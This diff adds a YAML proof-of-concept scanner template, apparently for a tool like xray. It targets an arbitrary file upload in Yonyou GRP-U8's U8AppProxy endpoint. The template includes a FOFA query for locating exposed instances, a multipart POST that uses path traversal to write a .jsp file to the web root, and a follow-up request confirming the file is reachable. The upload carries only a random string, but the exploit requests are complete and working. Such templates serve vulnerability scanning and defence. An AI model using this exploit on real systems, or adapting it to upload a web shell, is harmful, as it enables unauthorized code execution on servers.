@@ -1,0 +1,41 @@
+id: poc-yaml-yongyou-grp-u8-appproxy-anyfile-upload
+info:
+  name: 用友GRP-U8 U8AppProxy 任意文件上传
+  severity: critical
+  tags:
+  - 文件上传
+  finger: GRP-U8
+  fofa: body="login.jsp?up=1" || body="GRP-U8"
+variables:
+  filename: random_str(6)
+  content: random_str(32)
+requests:
+- method: POST
+  path: /U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../{{.filename}}
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryW0vdr4bjEUTVj3Sw
+  data: '------WebKitFormBoundaryW0vdr4bjEUTVj3Sw
+
+    Content-Disposition: form-data; name="file";filename="1.jsp"
+
+    Content-Type: image/png
+
+
+    {{.content}}
+
+    ------WebKitFormBoundaryW0vdr4bjEUTVj3Sw--
+
+    '
+  expression: 'status_code == 500 &&
+
+    contains(body,"apache")
+
+    '
+- method: POST
+  path: /{{.filename}}.jsp
+  expression: 'status_code == 200 &&
+
+    contains(body,content)
+
+    '
+transport: http
